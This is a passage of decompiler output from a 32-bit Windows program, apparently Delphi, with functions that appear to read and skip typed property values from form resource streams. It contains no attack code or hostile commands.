// 4176E0: using guessed type int (*off_4176E0[3])();

//----- (0041C9F8) --------------------------------------------------------
_BYTE *__usercall sub_41C9F8@<eax>(_DWORD *a1@<eax>, int **a2@<edx>)
{
  unsigned __int8 (*v3)(void); // ebx
  int v5; // [esp+Ch] [ebp-8h]

  v3 = (unsigned __int8 (*)(void))sub_418854(**a2);
  if ( v3 && v3() )
    return sub_4166D4(a1, (int)a2, v5);
  else
    return (_BYTE *)sub_41B768();
}
// 41CA2A: variable 'v5' is possibly undefined

//----- (0041CA40) --------------------------------------------------------
int __usercall sub_41CA40@<eax>(int a1@<eax>, int a2@<edx>, __int32 a3@<ecx>, int a4)
{
  int v4; // eax

  v4 = sub_41B424((int)&off_41B398, 1, a1, a3, 0, a2, *(_DWORD *)(*(_DWORD *)(a4 - 4) + 24));
  return sub_418B44(*(_DWORD **)(*(_DWORD *)(a4 - 4) + 48), v4);
}
// 41B398: using guessed type void *off_41B398;

//----- (0041CA80) --------------------------------------------------------
_DWORD *__cdecl sub_41CA80(int a1)
{
  int v1; // ecx
  int v2; // ecx
  int v3; // eax
  int v5; // [esp-14h] [ebp-1Ch]
  int v6; // [esp-10h] [ebp-18h]
  unsigned int v7[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v8; // [esp-4h] [ebp-Ch]
  __int32 v9; // [esp+0h] [ebp-8h] BYREF
  int v10; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_41CB32;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( (unsigned __int8)sub_41BC54((_DWORD *)*(_DWORD *)(a1 - 4), v1) == 13 )
  {
    sub_41D0FC(*(_DWORD **)(a1 - 4), v2);
    sub_405F40(&v10);
    sub_417090(*(_DWORD **)(a1 - 8), *(_DWORD *)(a1 - 12), v10);
  }
  else
  {
    v6 = *(_DWORD *)(*(_DWORD *)(a1 - 4) + 24);
    v5 = *(_DWORD *)(a1 - 12);
    sub_41C4FC(*(_DWORD **)(a1 - 4), &v9, v2);
    v3 = sub_41B424((int)&off_41B410, 1, *(_DWORD *)(a1 - 8), v9, 0, v5, v6);
    sub_418B44(*(_DWORD **)(*(_DWORD *)(a1 - 4) + 48), v3);
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_41CB39;
  sub_40426C(&v9);
  return sub_405F40(&v10);
}
// 41CA9B: variable 'v1' is possibly undefined
// 41CAAA: variable 'v2' is possibly undefined
// 41B410: using guessed type int (*off_41B410)();

//----- (0041CB40) --------------------------------------------------------
int __usercall sub_41CB40@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>, __int32 a3@<ecx>, int a4@<esi>)
{
  int v4; // ecx
  int *v5; // eax
  int v6; // eax
  _BYTE *v7; // ebx
  int v8; // ecx
  int v9; // eax
  unsigned __int8 v10; // al
  int v11; // eax
  int v12; // eax
  char v13; // al
  int v14; // ecx
  int *v15; // eax
  int v16; // ecx
  __int64 v17; // rax
  _TBYTE v19; // [esp+0h] [ebp-58h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+Ch] [ebp-4Ch] BYREF
  void *v21; // [esp+10h] [ebp-48h]
  int *v22; // [esp+14h] [ebp-44h]
  char v23[16]; // [esp+1Ch] [ebp-3Ch] BYREF
  __int32 v24; // [esp+2Ch] [ebp-2Ch] BYREF
  __int32 v25; // [esp+30h] [ebp-28h] BYREF
  OLECHAR *v26; // [esp+34h] [ebp-24h] BYREF
  char *v27; // [esp+38h] [ebp-20h] BYREF
  _BYTE *v28; // [esp+3Ch] [ebp-1Ch] BYREF
  __int32 v29; // [esp+40h] [ebp-18h] BYREF
  int v30[2]; // [esp+44h] [ebp-14h] BYREF
  int **v31; // [esp+4Ch] [ebp-Ch]
  _DWORD *v32; // [esp+50h] [ebp-8h]
  _DWORD *v33; // [esp+54h] [ebp-4h] BYREF
  int savedregs; // [esp+58h] [ebp+0h] BYREF

  v4 = _InterlockedExchange((volatile __int32 *)&v33, a3);
  v31 = (int **)v4;
  v32 = a2;
  v33 = a1;
  v22 = &savedregs;
  v21 = &loc_41CE55;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( !*(_DWORD *)(v4 + 8) )
  {
    if ( *(_BYTE *)**v31 != 7
      || (LOBYTE(v5) = sub_416660(v32, (int)v31), !sub_4036C0(v5, (int)off_418058))
      || (LOBYTE(v6) = sub_416660(v32, (int)v31), (*(_BYTE *)(v6 + 36) & 4) == 0) )
    {
      sub_41B750(ExceptionList, v21, v22);
    }
  }
  v7 = (_BYTE *)**v31;
  switch ( *v7 )
  {
    case 1:
      if ( (unsigned __int8)sub_41BC54(v33, v4) == 7 )
      {
        sub_41C4FC(v33, &v29, v8);
        sub_41C9F8(v32, v31);
      }
      else
      {
        v9 = sub_41C5FC(v33, v8);
        sub_4166D4(v32, (int)v31, v9);
      }
      break;
    case 2:
      v10 = (unsigned __int8)sub_41BD00(v33);
      sub_4166D4(v32, (int)v31, v10);
      break;
    case 3:
      sub_41C4FC(v33, (volatile __int32 *)&v28, v4);
      v11 = sub_416508(v7, v28);
      sub_4166D4(v32, (int)v31, v11);
      break;
    case 4:
      *(double *)&v19 = sub_41C3F0(v33, v4);
      sub_416CA8(v32, (int)v31, v19);
      break;
    case 5:
    case 0xA:
      sub_41CF5C(v33, &v27);
      sub_4169A8(v32, v31, v27);
      break;
    case 6:
      v12 = sub_41CE64(v33, **v31);
      sub_4166D4(v32, (int)v31, v12);
      break;
    case 7:
      v13 = sub_41BC54(v33, v4) - 13;
      if ( v13 )
      {
        if ( v13 == 1 )
        {
          sub_41D0FC(v33, v14);
          LOBYTE(v15) = sub_416660(v32, (int)v31);
          sub_41BD58(v33, v15);
        }
        else
        {
          sub_41C4FC(v33, &v25, v14);
          sub_41CA40((int)v32, (int)v31, v25, (int)&savedregs);
        }
      }
      else
      {
        sub_41D0FC(v33, v14);
        sub_4166D4(v32, (int)v31, 0);
      }
      break;
    case 8:
      if ( (unsigned __int8)sub_41BC54(v33, v4) == 13 )
      {
        sub_41D0FC(v33, v16);
        sub_416F74(v32, (int)v31, &aTpf0[4]);
      }
      else
      {
        sub_41C4FC(v33, &v24, v16);
        v30[0] = (*(int (__fastcall **)(__int32, _DWORD))(*v33 + 24))(v24, v33[6]);
        v30[1] = v33[6];
        if ( v30[0] )
          sub_416F74(v32, (int)v31, v30);
      }
      break;
    case 0xB:
      sub_41D018(v33, &v26, v4, (int)v7, a4);
      sub_416ABC(v32, (int)v31, v26);
      break;
    case 0xC:
      sub_41D80C();
      sub_416EF4(v32, (int)v31, (int)v23);
      break;
    case 0xF:
      sub_41CA80((int)&savedregs);
      break;
    case 0x10:
      v17 = sub_41C668(v33, v4);
      sub_416FD4(v32, (int)v31, v17, SHIDWORD(v17));
      break;
    default:
      break;
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v22 = (int *)&loc_41CE5C;
  sub_405160();
  sub_404290((int)&v24, 2);
  sub_404900(&v26);
  return sub_404290((int)&v27, 3);
}
// 41CB91: variable 'v5' is possibly undefined
// 41CBA5: variable 'v6' is possibly undefined
// 41CC17: variable 'v4' is possibly undefined
// 41CC26: variable 'v8' is possibly undefined
// 41CCB0: variable 'v19' is possibly undefined
// 41CD67: variable 'v14' is possibly undefined
// 41CD56: variable 'v15' is possibly undefined
// 41CD8F: variable 'v16' is possibly undefined
// 418058: using guessed type int (*off_418058[7])();
// 41B750: using guessed type int __cdecl sub_41B750(_DWORD, _DWORD, _DWORD);
// 41D80C: using guessed type int sub_41D80C(void);
// 41CB40: using guessed type char var_3C[16];

//----- (0041CE64) --------------------------------------------------------
int __usercall sub_41CE64@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v3; // ecx
  _BYTE *v4; // esi
  int v5; // ebx
  unsigned int v6; // eax
  unsigned int v8[3]; // [esp-18h] [ebp-2Ch] BYREF
  unsigned int v9[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v10; // [esp-4h] [ebp-18h]
  char *v11; // [esp+Ch] [ebp-8h] BYREF
  _DWORD *v12; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v11 = 0;
  v12 = a1;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_41CF0E;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v8[2] = (unsigned int)&savedregs;
  v8[1] = (unsigned int)&loc_41CEE1;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  if ( (unsigned __int8)sub_41D0FC(a1, 0) != 11 )
    sub_41B768();
  v4 = **(_BYTE ***)(sub_4163BC(a2) + 1);
  v5 = 0;
  while ( 1 )
  {
    sub_41CF20(v12, &v11, v3);
    if ( !v11 )
      break;
    v6 = sub_416508(v4, v11);
    if ( v6 <= 0x1F )
      v5 |= 1 << v6;
  }
  __writefsdword(0, v8[0]);
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_41CF15;
  sub_40426C(&v11);
  return v5;
}
// 41CEB8: variable 'v3' is possibly undefined

//----- (0041CF20) --------------------------------------------------------
_DWORD *__usercall sub_41CF20@<eax>(_DWORD *a1@<eax>, char **a2@<edx>, int a3@<ecx>)
{
  char *v5; // eax
  int v7[3]; // [esp+0h] [ebp-Ch] BYREF

  v7[0] = a3;
  sub_41BC78(a1, (char *)v7, 1u);
  sub_40435C(a2, 0, LOBYTE(v7[0]));
  v5 = sub_404774(a2);
  return sub_41BC78(a1, v5, LOBYTE(v7[0]));
}
// 41CF20: using guessed type int var_C[3];

//----- (0041CF5C) --------------------------------------------------------
OLECHAR **__usercall sub_41CF5C@<eax>(_DWORD *a1@<eax>, char **a2@<edx>)
{
  char v4; // al
  int v5; // ecx
  char v6; // al
  unsigned int v8[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v9; // [esp-4h] [ebp-14h]
  OLECHAR *v10; // [esp+8h] [ebp-8h] BYREF
  unsigned int v11; // [esp+Ch] [ebp-4h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_41D009;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v4 = sub_41BC54(a1, 0) - 18;
  if ( v4 && v4 != 2 )
  {
    v11 = 0;
    v6 = sub_41D0FC(a1, v5) - 6;
    if ( v6 )
    {
      if ( v6 == 6 )
        sub_41BC78(a1, (char *)&v11, 4u);
      else
        sub_41B768();
    }
    else
    {
      sub_41BC78(a1, (char *)&v11, 1u);
    }
    sub_40484C(a2, v11);
    sub_41BC78(a1, *a2, v11);
  }
  else
  {
    sub_41D018(a1, &v10, v5, (int)a1, (int)a2);
    sub_4044EC(a2, v10);
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_41D010;
  return sub_404900(&v10);
}
// 41CF8F: variable 'v5' is possibly undefined

//----- (0041D018) --------------------------------------------------------
_DWORD *__usercall sub_41D018@<eax>(_DWORD *a1@<eax>, OLECHAR **a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<esi>)
{
  char v7; // al
  int v8; // ecx
  char v9; // al
  unsigned int v11[2]; // [esp-14h] [ebp-20h] BYREF
  int *v12; // [esp-Ch] [ebp-18h]
  int v13; // [esp-8h] [ebp-14h]
  int v14; // [esp-4h] [ebp-10h]
  const CHAR *v15; // [esp+0h] [ebp-Ch] BYREF
  char *v16; // [esp+4h] [ebp-8h] BYREF
  int v17; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v17 = 0;
  v16 = 0;
  v15 = 0;
  v14 = a4;
  v13 = a5;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_41D0EF;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v7 = sub_41BC54(a1, a3) - 6;
  if ( v7 && v7 != 6 )
  {
    v17 = 0;
    v9 = sub_41D0FC(a1, v8) - 18;
    if ( v9 )
    {
      if ( v9 == 2 )
      {
        sub_41BC78(a1, (char *)&v17, 4u);
        sub_40484C(&v16, v17);
        sub_41BC78(a1, v16, v17);
        sub_4062E0(v16, a2);
      }
      else
      {
        sub_41B768();
      }
    }
    else
    {
      sub_41BC78(a1, (char *)&v17, 4u);
      sub_404BA8((int *)a2, (OLECHAR *)v17);
      sub_41BC78(a1, (char *)*a2, 2 * v17);
    }
  }
  else
  {
    sub_41CF5C();
    sub_404A4C((int *)a2, v15);
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_41D0F6;
  sub_40426C(&v15);
  return sub_40426C(&v16);
}
// 41D018: could not find valid save-restore pair for ebx
// 41D018: could not find valid save-restore pair for esi
// 41D061: variable 'v8' is possibly undefined
// 41CF5C: using guessed type int sub_41CF5C(void);

//----- (0041D0FC) --------------------------------------------------------
__int64 __usercall sub_41D0FC@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  __int64 result; // rax
  int v3; // [esp+0h] [ebp-4h] BYREF

  v3 = a2;
  LODWORD(result) = sub_41BC78(a1, (char *)&v3, 1u);
  LOBYTE(result) = v3;
  HIDWORD(result) = v3;
  return result;
}

//----- (0041D110) --------------------------------------------------------
_DWORD *__usercall sub_41D110@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  unsigned int v4[2]; // [esp-10h] [ebp-14h] BYREF
  int *v5; // [esp-8h] [ebp-Ch]
  char *v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_41D14C;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  do
    sub_41CF20(a1, &v6, a2);
  while ( v6 );
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_41D153;
  return sub_40426C(&v6);
}
// 41D12B: variable 'a2' is possibly undefined

//----- (0041D158) --------------------------------------------------------
int __cdecl sub_41D158(int a1)
{
  int v1; // ecx
  void *v2; // ecx

  while ( !sub_41B910(*(_DWORD **)(a1 - 4), v1) )
    sub_41D20C();
  return sub_41C6B4(v2);
}
// 41D16D: variable 'v1' is possibly undefined
// 41D178: variable 'v2' is possibly undefined
// 41D20C: using guessed type int sub_41D20C(void);

//----- (0041D180) --------------------------------------------------------
_DWORD *__usercall sub_41D180@<eax>(int a1@<eax>, int a2)
{
  int v4; // [esp+4h] [ebp-4h] BYREF

  sub_41BC78(*(_DWORD **)(a2 - 4), (char *)&v4, 4u);
  return sub_41D604(*(_DWORD **)(a2 - 4), a1 * v4);
}

//----- (0041D1B0) --------------------------------------------------------
int __cdecl sub_41D1B0(int a1)
{
  int v1; // ecx
  _DWORD **v2; // ebx
  int v3; // ecx
  void *v4; // ecx
  void *v5; // ecx

  v2 = (_DWORD **)(a1 - 4);
  while ( !sub_41B910(*v2, v1) )
  {
    if ( (unsigned __int8)(sub_41BC54(*v2, (int)v5) - 2) < 3u )
      sub_41D20C();
    sub_41D604(*v2, 1);
    while ( !sub_41B910(*v2, v3) )
      sub_41D3A8(*v2, (int)v4);
    sub_41C6B4(v4);
  }
  return sub_41C6B4(v5);
}
// 41D1BE: variable 'v5' is possibly undefined
// 41D1E0: variable 'v4' is possibly undefined
// 41D1E7: variable 'v3' is possibly undefined
// 41D1F9: variable 'v1' is possibly undefined
// 41D20C: using guessed type int sub_41D20C(void);

//----- (0041D20C) --------------------------------------------------------
_DWORD *__usercall sub_41D20C@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  int v2; // ecx
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  char *v6; // [esp+0h] [ebp-8h] BYREF
  _DWORD *v7; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v6 = 0;
  v7 = a1;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_41D39B;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  switch ( sub_41D0FC(a1, a2) & 0x7F )
  {
    case 1i64:
      sub_41D158((int)&savedregs);
      break;
    case 2i64:
      sub_41D604(v7, 1);
      break;
    case 3i64:
      sub_41D604(v7, 2);
      break;
    case 4i64:
    case 0xFi64:
      sub_41D604(v7, 4);
      break;
    case 5i64:
      sub_41D604(v7, 10);
      break;
    case 6i64:
    case 7i64:
      sub_41CF20(v7, &v6, v2);
      break;
    case 0xAi64:
    case 0xCi64:
    case 0x14i64:
      sub_41D180(1, (int)&savedregs);
      break;
    case 0xBi64:
      sub_41D110(v7, v2);
      break;
    case 0xEi64:
      sub_41D1B0((int)&savedregs);
      break;
    case 0x10i64:
    case 0x11i64:
    case 0x13i64:
      sub_41D604(v7, 8);
      break;
    case 0x12i64:
      sub_41D180(2, (int)&savedregs);
      break;
    default:
      break;
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_41D3A2;
  return sub_40426C(&v6);
}
// 41D2F6: variable 'v2' is possibly undefined

//----- (0041D3A8) --------------------------------------------------------
_DWORD *__usercall sub_41D3A8@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  unsigned int v3[2]; // [esp-10h] [ebp-14h] BYREF
  int *v4; // [esp-8h] [ebp-Ch]
  char *v5; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v5 = 0;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_41D3E5;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_41CF20(a1, &v5, a2);
  sub_41D20C();
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_41D3EC;
  return sub_40426C(&v5);
}
// 41D20C: using guessed type int sub_41D20C(void);

//----- (0041D3F0) --------------------------------------------------------
int __usercall sub_41D3F0@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  int v2; // ecx
  int v4; // ecx
  int v5; // ecx
  void *v6; // ecx
  int v7; // ecx
  void *v8; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v11; // [esp-8h] [ebp-20h]
  int *v12; // [esp-4h] [ebp-1Ch]
  char *v13; // [esp+8h] [ebp-10h] BYREF
  char *v14; // [esp+Ch] [ebp-Ch] BYREF
  char v15[7]; // [esp+10h] [ebp-8h] BYREF
  char v16; // [esp+17h] [ebp-1h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v2 = 0;
  v13 = 0;
  v14 = 0;
  v12 = &savedregs;
  v11 = &loc_41D488;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( a2 )
  {
    (*(void (__fastcall **)(char *, char *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))(*a1 + 36))(
      v15,
      &v16,
      ExceptionList,
      v11,
      v12);
    sub_41CF20(a1, &v14, v4);
    sub_41CF20(a1, &v13, v5);
  }
  while ( !sub_41B910(a1, v2) )
    sub_41D3A8(a1, (int)v6);
  sub_41C6B4(v6);
  while ( !sub_41B910(a1, v7) )
    sub_41D3F0();
  sub_41C6B4(v8);
  __writefsdword(0, (unsigned int)ExceptionList);
  v12 = (int *)&loc_41D48F;
  return sub_404290((int)&v13, 2);
}
// 41D426: variable 'v4' is possibly undefined
// 41D430: variable 'v5' is possibly undefined
// 41D439: variable 'v6' is possibly undefined
// 41D440: variable 'v2' is possibly undefined
// 41D45D: variable 'v7' is possibly undefined
// 41D468: variable 'v8' is possibly undefined
// 41D3F0: using guessed type char var_8[7];

//----- (0041D498) --------------------------------------------------------
int __usercall sub_41D498@<eax>(int a1@<eax>, __int32 a2@<edx>, int a3@<ecx>)
{
  int v5; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v8; // [esp-8h] [ebp-24h]
  int *v9; // [esp-4h] [ebp-20h]
  int v10; // [esp+0h] [ebp-1Ch]
  _BYTE *v11; // [esp+Ch] [ebp-10h] BYREF
  char v12; // [esp+10h] [ebp-Ch]
  _BYTE *v13; // [esp+14h] [ebp-8h] BYREF
  int v14; // [esp+18h] [ebp-4h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v13 = 0;
  v9 = &savedregs;
  v8 = &loc_41D53D;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_404304((volatile __int32 *)&v13, a2);
  v14 = 0;
  if ( *(_DWORD *)(a1 + 28) )
    v14 = sub_41FF6C(*(_DWORD *)(a1 + 28), v13);
  if ( !v14 )
  {
    if ( *(_WORD *)(a1 + 82) )
      (*(void (__fastcall **)(_BYTE *, int, int *, int))(a1 + 80))(v13, a1, &v14, a3);
    if ( !v14 )
    {
      v11 = v13;
      v12 = 11;
      v5 = sub_409660((int)dword_417348, 1, off_42B8D4[0], 0, (int)&v11);
      sub_403CCC(v5, (int)ExceptionList, (int)v8, (int)v9, v10);
    }
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v9 = (int *)&loc_41D544;
  sub_40426C(&v13);
  return v14;
}
// 417348: using guessed type int dword_417348[3];
// 42B8D4: using guessed type int **off_42B8D4[2];

//----- (0041D550) --------------------------------------------------------
int __usercall sub_41D550@<eax>(int result@<eax>, int a2@<edx>)
{
  if ( *(_WORD *)(result + 74) )
    return (*(int (__fastcall **)(int, int))(result + 72))(a2, result);
  return result;
}

//----- (0041D568) --------------------------------------------------------
int __usercall sub_41D568@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  if ( *(_WORD *)(a1 + 66) )
    (*(void (__fastcall **)(int, int, int))(a1 + 64))(a2, a1, a3);
  return (*(int (**)(void))(*(_DWORD *)a2 + 24))();
}

//----- (0041D590) --------------------------------------------------------
int __usercall sub_41D590@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v6[3]; // [esp+4h] [ebp-Ch] BYREF

  v6[0] = a3;
  v6[0] = sub_41BBA8(a1, *(_DWORD *)(a1 + 24), a2);
  if ( !v6[0] && *(_DWORD *)(a1 + 28) && *(_DWORD *)(a1 + 28) != *(_DWORD *)(a1 + 24) )
    v6[0] = sub_41BBA8(a1, *(_DWORD *)(a1 + 28), a2);
  if ( *(_WORD *)(a1 + 98) )
    (*(void (__fastcall **)(int, int, int *))(a1 + 96))(a2, a1, v6);
  if ( !v6[0] || !sub_40372C(v6[0], (int)off_418058) )
    sub_418610(a2);
  return v6[0];
}
// 418058: using guessed type int (*off_418058[7])();
// 41D590: using guessed type int var_C[3];

//----- (0041D604) --------------------------------------------------------
_DWORD *__usercall sub_41D604@<eax>(_DWORD *result@<eax>, signed int a2@<edx>)
{
  signed int v2; // ebx
  _DWORD *v3; // esi
  char v4[264]; // [esp+0h] [ebp-108h] BYREF

  v2 = a2;
  v3 = result;
  while ( v2 > 0 )
  {
    if ( v2 <= 256 )
    {
      result = sub_41BC78(v3, v4, v2);
      v2 = 0;
    }
    else
    {
      result = sub_41BC78(v3, v4, 0x100u);
      v2 -= 256;
    }
  }
  return result;
}

//----- (0041D64C) --------------------------------------------------------
_DWORD *__usercall sub_41D64C@<eax>(_WORD *a1@<eax>, int a2@<ecx>, int a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-24h] [ebp-44h] BYREF
  void *v8; // [esp-20h] [ebp-40h]
  int *v9; // [esp-1Ch] [ebp-3Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *v10; // [esp-18h] [ebp-38h] BYREF
  void *v11; // [esp-14h] [ebp-34h]
  int *v12; // [esp-10h] [ebp-30h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  void *v14; // [esp-8h] [ebp-28h]
  int *v15; // [esp-4h] [ebp-24h]
  void *v16; // [esp+0h] [ebp-20h]
  int v17; // [esp+4h] [ebp-1Ch] BYREF
  char *v18; // [esp+8h] [ebp-18h] BYREF
  int *v19; // [esp+Ch] [ebp-14h] BYREF
  int v20; // [esp+10h] [ebp-10h] BYREF
  _DWORD *v21; // [esp+14h] [ebp-Ch]
  _DWORD *v22; // [esp+18h] [ebp-8h]
  _DWORD *v23; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v18 = 0;
  v17 = 0;
  v15 = &savedregs;
  v14 = &loc_41D7F0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_41B7DC(*(_DWORD **)(a3 - 4), 10, a2);
  v23 = sub_403504(&off_417DB0, 1);
  v22 = sub_403504(&off_417DB0, 1);
  v12 = &savedregs;
  v11 = &loc_41D7CB;
  v10 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v10);
  sub_41BC78(*(_DWORD **)(a3 - 4), (char *)&v20, 4u);
  sub_41AB24((int)v23, v20, v20 >> 31);
  sub_41BC78(*(_DWORD **)(a3 - 4), (char *)v23[1], v20);
  v21 = sub_41B2D8((int)&off_417E90, 1, (int)v23, 1024);
  v9 = &savedregs;
  v8 = &loc_41D7A6;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v7);
  sub_41CF5C(v21, &v18);
  sub_41BC78(v21, (char *)&v20, 4u);
  sub_41AB24((int)v22, v20, v20 >> 31);
  sub_41BC78(v21, (char *)v22[1], v20);
  if ( !sub_415F44(v18, &v19) || (v4 = sub_405F40(&v17), !(unsigned __int8)sub_40AD80(v19, dword_41D7FC, v4)) )
  {
    v5 = sub_409624((int)dword_417348, 1, off_42BA44[0]);
    sub_403CCC((int)v5, (int)v7, (int)v8, (int)v9, (int)v10);
  }
  *a1 = *((_WORD *)v19 + 2);
  (*(void (__fastcall **)(_DWORD *, _WORD *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v17 + 12))(
    v22,
    a1,
    v7,
    v8,
    v9,
    v10,
    v11,
    v12,
    ExceptionList);
  __writefsdword(0, (unsigned int)v14);
  v16 = &loc_41D7AD;
  sub_403534(v21);
  __writefsdword(0, (unsigned int)v14);
  v16 = &loc_41D7D2;
  sub_403534(v22);
  sub_403534(v23);
  __writefsdword(0, (unsigned int)v14);
  v16 = &loc_41D7F7;
  sub_405F40(&v17);
  return sub_40426C(&v18);
}
// 417348: using guessed type int dword_417348[3];
// 417DB0: using guessed type int (*off_417DB0)();
// 417E90: using guessed type int (*off_417E90)();
// 41D7FC: using guessed type int dword_41D7FC[4];
// 42BA44: using guessed type int **off_42BA44[8];

//----- (0041D80C) --------------------------------------------------------
#error "41D9B0: call analysis failed (funcsize=134)"

//----- (0041DA04) --------------------------------------------------------
int __usercall sub_41DA04@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  int result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_41DBD0((int)v2);
  result = sub_41B320(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return sub_4038B4(v5);
  return result;
}
// 41DA0B: variable 'v3' is possibly undefined

//----- (0041DA30) --------------------------------------------------------
int __usercall sub_41DA30@<eax>(int a1@<eax>, int a2@<edx>)
{
  return sub_418B44(*(_DWORD **)(a1 + 48), a2);
}

//----- (0041DA3C) --------------------------------------------------------
int __userpurge sub_41DA3C@<eax>(
        int result@<eax>,
        char *a2@<edx>,
        char a3@<cl>,
        int (*a4)(void),
        int a5,
        int a6,
        int a7)
{
  if ( a3 )
  {
    if ( HIWORD(a4) )
    {
      sub_41F858(result, a2);
      return a4();
    }
  }
  return result;
}

//----- (0041DA64) --------------------------------------------------------
_DWORD *__userpurge sub_41DA64@<eax>(
        _DWORD *result@<eax>,
        char *a2@<edx>,
        char a3@<cl>,
        void (__stdcall *a4)(struct _EXCEPTION_REGISTRATION_RECORD *),
        int a5,
        int a6,
        int a7)
{
  _DWORD *v7; // ebx

  v7 = result;
  if ( a3 )
  {
    if ( HIWORD(a4) )
    {
      sub_41F858((int)result, a2);
      return sub_41DB48(v7, a4, a5);
    }
  }
  return result;
}

//----- (0041DA90) --------------------------------------------------------
int __usercall sub_41DA90@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(a1 + 16) + sub_41AAA0(*(_DWORD *)(a1 + 4));
}

//----- (0041DAA0) --------------------------------------------------------
// attributes: thunk
int __usercall sub_41DAA0@<eax>(int a1@<eax>)
{
  return sub_41DBD0(a1);
}

//----- (0041DAA8) --------------------------------------------------------
int __usercall sub_41DAA8@<eax>(int a1@<eax>, int a2@<edx>)
{
  int result; // eax

  result = sub_41AAA0(*(_DWORD *)(a1 + 4));
  if ( result <= a2 && a2 <= result + *(_DWORD *)(a1 + 16) )
  {
    *(_DWORD *)(a1 + 16) = a2 - result;
  }
  else
  {
    sub_41DBD0(a1);
